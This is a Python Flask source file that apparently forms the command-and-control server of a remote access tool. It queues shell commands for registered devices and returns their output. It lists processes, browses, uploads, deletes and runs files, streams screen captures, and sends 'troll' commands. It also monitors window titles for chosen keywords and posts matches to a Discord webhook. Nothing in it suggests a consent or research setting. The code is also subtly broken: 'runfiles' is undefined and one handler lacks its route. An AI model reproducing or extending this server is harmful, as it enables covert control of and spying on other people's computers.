from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["http://localhost:3000", "http://localhost:3001", "https://python-backend-y3ul.onrender.com"])

devices = []
frames = {}
commands = {}
cmd_results = {}
processes = {}
files = {}
file_requests = {}
file_uploads = {}
file_deletes = {}
file_data = {}
winnoti = {}       # device -> list of matched window titles
keywords = {}       # device -> list of keywords
webhooks = {}      # device -> discord webhook url
troll_cmds = {}

@app.route('/')
def home():
    return "backend running"

@app.route('/api/devices', methods=['GET'])
def list_devices():
    return jsonify(devices)

@app.route('/api/devices', methods=['POST'])
def add_device():
    data = request.json
    name = data.get('name')
    for d in devices:
        if d.get('name') == name:
            d.update(data)
            return jsonify({"ok": True})
    devices.append(data)
    return jsonify({"ok": True})

@app.route('/api/devices', methods=['DELETE'])
def remove_device():
    name = request.args.get('name')
    global devices
    devices = [d for d in devices if d.get('name') != name]
    return jsonify({"ok": True})

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    device = data.get('device_id') or data.get('device')
    cmd = data.get('command', '')
    commands.setdefault(device, []).append(cmd)
    return jsonify({"ok": True})

@app.route('/api/commands', methods=['GET'])
def get_commands():
    device = request.args.get('device')
    cmds = commands.pop(device, [])
    return jsonify({"commands": cmds})

@app.route('/api/command_result', methods=['POST'])
def post_result():
    data = request.json
    device = data.get('device')
    output = data.get('output', '')
    cmd_results[device] = output
    return jsonify({"ok": True})

@app.route('/api/command_result', methods=['GET'])
def get_result():
    device = request.args.get('device')
    return jsonify({"output": cmd_results.get(device, "")})

@app.route('/api/processes', methods=['GET'])
def get_processes():
    device = request.args.get('device')
    return jsonify({"processes": processes.get(device, [])})

@app.route('/api/processes', methods=['POST'])
def post_processes():
    data = request.json
    device = data.get('device')
    processes[device] = data.get('processes', [])
    return jsonify({"ok": True})

@app.route('/api/files', methods=['GET'])
def get_files():
    device = request.args.get('device')
    path = request.args.get('path', '.')
    key = device + ':' + path
    if key not in files:
        file_requests.setdefault(device, []).append(path)
        return jsonify({"files": []})
    return jsonify({"files": files.get(key, [])})

@app.route('/api/files', methods=['POST'])
def post_files():
    data = request.json
    device = data.get('device')
    path = data.get('path', '.')
    key = device + ':' + path
    files[key] = data.get('files', [])
    return jsonify({"ok": True})

@app.route('/api/file_requests', methods=['GET'])
def get_file_requests():
    device = request.args.get('device')
    reqs = file_requests.pop(device, [])
    return jsonify({"requests": reqs})

@app.route('/api/file_requests', methods=['POST'])
def post_file_request():
    data = request.json
    device = data.get('device')
    path = data.get('path', '.')
    file_requests.setdefault(device, []).append(path)
    return jsonify({"ok": True})

@app.route('/api/file_uploads', methods=['GET'])
def get_file_uploads():
    device = request.args.get('device')
    ups = file_uploads.pop(device, [])
    return jsonify({"uploads": ups})

@app.route('/api/file_uploads', methods=['POST'])
def post_file_upload():
    data = request.json
    device = data.get('device')
    file_uploads.setdefault(device, []).append(data)
    return jsonify({"ok": True})

@app.route('/api/file', methods=['GET'])
def get_file():
    device = request.args.get('device')
    path = request.args.get('path', '')
    key = device + ':' + path
    content = file_data.get(key)
    if content is not None:
        return jsonify({"content": content})
    return jsonify({"content": None}), 404

@app.route('/api/file', methods=['POST'])
def post_file():
    data = request.json
    device = data.get('device')
    path = data.get('path', '')
    content = data.get('content', '')
    key = device + ':' + path
    file_data[key] = content
    return jsonify({"ok": True})

@app.route('/api/file', methods=['DELETE'])
def delete_file():
    device = request.args.get('device')
    path = request.args.get('path', '')
    key = device + ':' + path
    files.pop(key, None)
    file_data.pop(key, None)
    file_deletes.setdefault(device, []).append(path)
    return jsonify({"ok": True})

@app.route('/api/file_deletes', methods=['GET'])
def get_file_deletes():
    device = request.args.get('device')
    dels = file_deletes.pop(device, [])
    return jsonify({"deletes": dels})

@app.route('/api/runfiles', methods=['GET'])
def get_runfiles():
    device = request.args.get('device')
    rf = runfiles.pop(device, [])
    return jsonify({"runfiles": rf})

@app.route('/api/runfiles', methods=['POST'])
def post_runfile():
    data = request.json
    device = data.get('device')
    runfiles.setdefault(device, []).append(data)
    return jsonify({"ok": True})

@app.route('/api/troll_cmds', methods=['GET'])
def get_troll_cmds():
    device = request.args.get('device')
    cmds = troll_cmds.pop(device, [])
    return jsonify({"cmds": cmds})

@app.route('/api/troll_cmds', methods=['POST'])
def post_troll_cmd():
    data = request.json
    device = data.get('device')
    troll_cmds.setdefault(device, []).append(data)
    return jsonify({"ok": True})

@app.route('/api/frame', methods=['POST'])
def upload_frame():
    data = request.json
    device = data.get('device')
    image = data.get('image')
    if device and image:
        frames[device] = image
    return jsonify({"ok": True})

@app.route('/api/frame', methods=['GET'])
def get_frame():
    device = request.args.get('device')
    img = frames.get(device)
    if img:
        return jsonify({"image": img})
    return jsonify({"image": None})

@app.route('/api/stream/<device>', methods=['GET'])
def stream(device):
    img = frames.get(device)
    if img:
        return jsonify({"image": img})
    return jsonify({"image": None})

@app.route('/api/keywords', methods=['GET'])
def get_keywords():
    device = request.args.get('device')
    return jsonify({"keywords": keywords.get(device, [])})

@app.route('/api/keywords', methods=['POST'])
def set_keywords():
    data = request.json
    device = data.get('device')
    kws = data.get('keywords', [])
    keywords[device] = kws
    # send command to agent via command queue
    commands.setdefault(device, []).append("setkeywords:" + "\n".join(kws))
    return jsonify({"ok": True})

import urllib.request
import json as _json

@app.route('/api/webhook', methods=['GET'])
def get_webhook():
    device = request.args.get('device')
    return jsonify({"webhook": webhooks.get(device, "")})

@app.route('/api/webhook', methods=['POST'])
def set_webhook():
    data = request.json
    device = data.get('device')
    url = data.get('webhook', '')
    webhooks[device] = url
    return jsonify({"ok": True})
def get_winnoti():
    device = request.args.get('device')
    return jsonify({"notifications": winnoti.get(device, [])})

@app.route('/api/winnoti', methods=['POST'])
def post_winnoti():
    data = request.json
    device = data.get('device')
    title = data.get('title', '')
    winnoti.setdefault(device, []).append(title)
    # keep last 50
    if len(winnoti[device]) > 50:
        winnoti[device] = winnoti[device][-50:]
    wh = webhooks.get(device, '')
    if wh:
        try:
            payload = _json.dumps({"content": f"Window match on {device}: {title}"}).encode()
            req = urllib.request.Request(wh, data=payload, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
